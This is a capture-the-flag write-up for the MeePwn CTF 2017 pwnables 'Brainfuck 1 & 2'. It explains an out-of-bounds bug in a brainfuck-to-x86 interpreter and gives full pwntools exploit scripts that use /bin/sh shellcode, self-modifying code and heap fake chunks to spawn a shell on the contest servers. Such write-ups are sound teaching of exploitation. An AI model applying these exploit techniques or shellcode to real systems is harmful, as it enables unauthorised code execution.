---
title: MeePwn CTF 2017 -- Brainfuck 1 & 2
layout: single
comments: true
share: true
related: true
author_profile: true
permalink: "/:title/"
tags:
- CTF
- Python
- Pwnable
- heap
- MeePwn
- brainfuck
- shellcode
categories:
- write-ups
date: '2017-07-16 15:28:00 +0000'
---

**Category:** Pwnable

Both binaries are 64 bit ELF, No RELRO, No canary, PIE & NX enabled.  

<!-- more -->

## Brainfuck1

The program is a simple [brainfuck](https://en.wikipedia.org/wiki/Brainfuck) language interpreter: it read input ( brainfuck code ), translate the code to the corresponding x86 machine code and execute it.

For example, if we input `+++++++++` ( 9 `+` ), the program will translate the code into the following machine code:

```
0x7ffff7ff5000:      push   rbp
0x7ffff7ff5001:      mov    rbp,rsp
0x7ffff7ff5004:      sub    rsp,0x20
0x7ffff7ff5008:      mov    r14,rdi   ; r14 is the data pointer 
0x7ffff7ff500b:      add    BYTE PTR [r14],0x9  ; [r14] += 9 
0x7ffff7ff500f:      add    rsp,0x20
0x7ffff7ff5013:      pop    rbp
0x7ffff7ff5014:      ret 
```

The program has the following data structure:

```c
struct bf_data{
    char *dp; // data pointer
    char *sc_buf; // machine code buffer
    __int64 field_16 ; // not sure about the usage
    __int64 sc_pos;  // machine code position
    __int64 sc_size; // machine code buffer size
}
```

The `bf_data` is placed on the heap memory. It will treat `bf_data->dp` as the first parameter while executing the machine code.


The vulnerability is quite simple: it did not have the boundary check for the data pointer increment/decrement. For example, it we input 1000 `>` and a `,`, we can write a byte at `bf_data->dp + 1000`, thus we have an out-of-bound read/write vulnerability.

Here's the basic concept of how I exploit the service:
1. Leak the machine code buffer address ( an mmap address with `rwx` permission )
2. Place our shellcode on the mmap buffer
3. Self-modified the machine code in `bf_data->sc_buf` so it will jump to our shellcode buffer and execute our shellcode.  


First we use the OOB read to leak the machine code buffer address. After that, we use OOB write to overwrite `bf_data->dp`, making it point to our shellcode buffer, then use `>` and `,` to write our shellcode to `bf_data->dp`.  

Now because `bf_data->dp` is near to `bf_data->sc_buf`, so again we can use the OOB write to modify the content of `bf_data->sc_buf`, creating a **self-modified machine code** situation. I decided to modify the end of the machine code into:
```
mov rax, shellcode_buf_addr
call rax
```


```python
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = "139.59.244.42"
PORT = 31337
ELF_PATH = "./bf1"

context.binary = ELF_PATH
context.log_level = 'INFO' # ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.terminal = ['tmux', 'splitw'] # for gdb.attach

elf = context.binary # context.binary is an ELF object

def cmd(s):
    r.sendlineafter(">>", s)

def write(move, content):
    payload = ""
    if move < 0:
        payload = "<" * abs(move)
    else:
        payload = ">" * abs(move)

    payload += ",>"*len(content)
    
    cmd(payload)
    r.sendline(content)


sc = "\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05"

if __name__ == "__main__":

    r = remote(HOST, PORT)
    
    # leak mmap address 
    payload = "<"*0x28 # move to &bf_data->sc_buf
    payload += ".>"*8

    cmd(payload)
    sc_base = u64(r.recvuntil(">>")[:8:]) >> 8
    r.unrecv(">>")
    log.success("sc_base: "+hex(sc_base))
    
    # make size = 0x400 so it won't clear our shellcode
    write(-0x10, p64(0x400))
    # change bf_data->dp = our shellcode buffer
    write(-0x30, p64(sc_base+0x800))
    # write final shellcode to our shellcode buffer
    write(0, sc)
    # write to bf_data->sc_buf ( it will become a self-modified shellcode)
    init_sc = asm("mov rax, %s" % hex(sc_base+0x800))
    init_sc += asm("call rax")
    print "init_sc", init_sc.encode('hex')
    print "len:", len(init_sc)
    write(-0x70d, init_sc)
    r.interactive()
```

flag: `MeePwnCTF{this_is_simple_challenge_:banana-dance:}`


## Brainfuck2

For Brainfuck2, the binary is basically the same as Brainfuck1, except it has the following exectuting process:

```c++
BrainFuckVM *__fastcall BrainFuckVM::run(BrainFuckVM *this)
{
    char *sc_buf; // ST20_8@1
    BrainFuckVM *v2; // ST18_8@1
    BrainFuckVM *result; // rax@3

    sc_buf = this->sc_buf;
    v2 = this;
    /* allocate + memset bf_data->dp */
    this->dp = (char *)operator new[](0x100uLL);
    memset(this->dp, 0, 0x100uLL);
    /* set the sc_buf's permission to r-x*/
    mprotect(v2->sc_buf, v2->sc_size, 5); 
    ((void (__fastcall *)(char *))sc_buf)(this->bf_mem);
    /* set the sc_buf's permission back to rw-*/
    mprotect(v2->sc_buf, v2->sc_size, 3);
    this->sc_pos = 0LL;
    memset(v2->sc_buf, 0, v2->sc_size);
    /* free bf_data->dp */
    if ( this->dp )
      operator delete(this->dp);
    result = this;
    this->dp = 0LL;
    return result;
}
```

Several changes are made:
1. We can hardly control the address of `bf_data->dp`, it will only be allocated before the execution of the machine code.
2. The `bf_data->sc_buf`'s permission is changed to `r-x`, so this time the self-modified trick won't work.

Luckily, the vulnerability is still there -- we can still use the OOB read/write to do some evil stuff ;)  

First of all, we can still use the OOB write to modify the `bf_data->dp` pointer, and because later the program will free this pointer, this means that **we can control the address that is being freed**. 

After program free the `bf_data->dp` pointer, the first memory allocation will be the command line buffer, which chunk size is `0x110`. If we freed a buffer with address `addr` and size = 0x110, later when the program allocate a memory for the command line buffer, it will take `addr` as the new buffer, **and so we can control the content of `addr`** by input our command ( the brainfuck code ).

Based on the above concept, I decided to do the following:
1. Use OOB read to leak the heap address
2. Use OOB write to create fake chunk at `bf_data - some_offset`
3. Use OOB write to overwrite `bf_data->dp`, making it point to our fake chunk

By doing this, the program will eventually allocate `bf_data - some_offset` to the command line buffer, **and thus making us able to control `bf_data` by input the next brainfuck code**.

Since now we can control the structure of `bf_data`, all we need to do is to overwrite the `bf_data->sc_buf`, making it point to our shellcode buffer, so we can execute our own shellcode and capture the flag. Before we overwrite `bf_data->sc_buf`, there're several things we'll need to be aware of:
1. We'll have to write our shellcode in our shellcode buffer first. Since we can't control `bf_data->dp`, I decided to use the `[>.,]` brainfuck code to write my shellcode. The brainfuck code will keep reading our input until it encounters a null byte ( thanks to wikipedia ). Our shellcode will be placed on `bf_data->dp + some_offset`.
2. Notice the program will modify the first several bytes of our shellcode, so it's better to pad some `NOP` at the beginning of our shellcode.
3. To avoid the program changing our shellcode into the `ret` instruction, we'll have to overwrite the `bf_data->sc_pos` data as well ( because the program will place the `ret` machine code at `bf_data->sc_buf + bf_data->sc_pos` ). Overwrite this data to a large number, so the `ret` instruction won't effect our shellcode.
 
Final exploit script:
```python
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = "139.59.244.42"
PORT = 31338
ELF_PATH = "./bf2"

context.binary = ELF_PATH
context.log_level = 'INFO' # ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.terminal = ['tmux', 'splitw'] # for gdb.attach

elf = context.binary # context.binary is an ELF object

def cmd(s):
    r.sendlineafter(">>", s)

def write(move, content, scmd=None, scontent=None):
    payload = ""
    if move < 0:
        payload = "<" * abs(move)
    else:
        payload = ">" * abs(move)

    payload += ",>"*len(content)
    if scmd:
        payload += scmd
        content += scontent
    payload = payload.ljust(512, "B")
    
    cmd(payload)
    r.sendline(content)


def leak(move, cnt):
    if move < 0:
        payload = "<" * abs(move)
    else:
        payload = ">" * abs(move)

    payload += ".>"*cnt
    payload = payload.ljust(512, "B")
    
    cmd(payload)
    r.recv(1024) # ¯\_(ツ)_/¯ 
    ret = r.recvuntil(">>")[:-2:]
    r.unrecv(">>")
    return ret

sc = "\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05"

if __name__ == "__main__":

    r = None
    if len(sys.argv) == 2:
        r = process(ELF_PATH)
    else:
        r = remote(HOST, PORT)
    
    # make unsortbin + libc address
    cmd("A"*512)

    # leak
    libc.address = u64(leak(0x110, 8)) - 0x3c3b78 # local
    log.success("libc base: "+hex(libc.address))
    heap_addr = u64(leak(-0x30, 8))
    log.success("heap_addr: "+hex(heap_addr))
    fake_chunk = heap_addr - 0x70
    log.success("fake_chunk: "+hex(fake_chunk))
    sc_buf = heap_addr + 0x3b0# our shellcode buffer
    log.success("sc_buf: "+hex(sc_buf))

    # fake chunk
    write(-0x78, p64(0x111) )
    special = "<"*0xd0 + ",>"*8
    # fake next size
    write(0x98, p64(0x71),special, p64(fake_chunk))
    # create gets-like function, puts shellcode @ 0xXXXXX000 ( our shellcode buffer)
    cmd(",[>.,]>>>>>>>>>,[>.,]")
    payload = "i"*0x108 + "\xa1\x01\x02\x00" # fake next size
    payload += "i"*0x190
    payload += "\x90"*0x10 + sc + "\x00"
    r.send(payload)
    # overwrite bf_data, make bf_data->sc_buf point to our shellcode buffer
    payload = "i"*0x40
    payload += p64(0) + p64(sc_buf) + p64(0x100) + p64(100) + p64(0x1000) + p64(0x111)
    cmd(payload)
    r.interactive()

```

flag: `MeePwnCTF{My_M33pwn_h34p_1s_fun?}`

Got both first blood on these challenges ! WOOHOO ! 😎🤘